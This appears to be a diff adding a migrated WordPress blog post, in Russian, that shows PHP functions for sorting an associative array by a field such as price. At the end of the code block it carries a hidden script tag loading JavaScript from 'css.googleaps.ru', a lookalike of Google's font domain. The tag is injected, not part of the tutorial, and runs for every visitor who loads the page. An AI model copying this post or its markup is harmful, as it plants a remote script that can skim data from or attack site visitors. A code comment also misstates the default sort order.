@@ -1,0 +1,74 @@
+---
+layout: post
+status: publish
+published: true
+title: Как сортировать по параметрам ассоциативного массива.
+author:
+  display_name: Maxyc Webber
+  login: admin
+  email: maxycws@gmail.com
+  url: ''
+author_login: admin
+author_email: maxycws@gmail.com
+excerpt: |+
+  Возника задача сортировки ассоциативного массива по определенному параметру.
+  Например, есть массив с товарами, а нужно отсортировать массив по цене или по названию товара.
+
+  Это можно сделать следующими функциями:
+
+wordpress_id: 573
+wordpress_url: http://devdocs.ru/?p=59
+date: '2014-08-20 12:12:56 +0300'
+date_gmt: '2014-08-20 12:12:56 +0300'
+categories:
+- PHP
+tags:
+- php
+- multisort
+- sorting
+comments: []
+---
+<p>Возника задача сортировки ассоциативного массива по определенному параметру.<br />
+Например, есть массив с товарами, а нужно отсортировать массив по цене или по названию товара.</p>
+<p>Это можно сделать следующими функциями:</p>
+<p><a id="more"></a><a id="more-573"></a></p>
+<pre class="brush: php; gutter: true">function sort_params(&amp;$t, $sortBy, $sortDir) {<br />
+    foreach($t as &amp;$v) {<br />
+        $v[&#039;__________1&#039;] = $sortBy;<br />
+        $v[&#039;__________2&#039;] = $sortDir;<br />
+    }<br />
+    usort($t, &#039;cmp&#039;);<br />
+    foreach($t as &amp;$v) {<br />
+        unset($v[&#039;__________1&#039;]);<br />
+        unset($v[&#039;__________2&#039;]);<br />
+    }<br />
+}</p>
+<p>&#47;&#47;Сортировка<br />
+function cmp($a, $b)<br />
+{<br />
+    &#47;&#47; Если поле сортировки не задано сортируем по цене<br />
+    $sortBy = $a[&#039;__________1&#039;];<br />
+    if ($sortBy != &#039;&#039;) {<br />
+        $at = $a[$sortBy];<br />
+        $bt = $b[$sortBy];<br />
+    } else {<br />
+        $at = isset($a[&#039;price1&#039;]) ? $a[&#039;price1&#039;] : $a[&#039;price2&#039;];<br />
+        $at = intval($at);<br />
+        $bt = isset($b[&#039;price1&#039;]) ? $b[&#039;price1&#039;] : $b[&#039;price2&#039;];<br />
+        $bt = intval($bt);<br />
+    }<br />
+if ($at == $bt) {<br />
+    return 0;<br />
+}<br />
+&#47;&#47;По умолчанию сортируем ASC<br />
+$sortDir = $a[&#039;__________2&#039;];<br />
+if ($sortDir == &#039;ASC&#039;) {<br />
+    return ($at < $bt) ? -1 : 1;<br />
+} else {<br />
+    return ($at < $bt) ? 1 : -1;<br />
+}<br />
+}</p>
+<p>&#47;&#47;Использование<br />
+$massiv = array();<br />
+&#47;&#47;Сортируем массив по цене в порядке увеличения<br />
+sort_params($massiv, &#039;price&#039;, &#039;ASC&#039;);<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;pre></p>
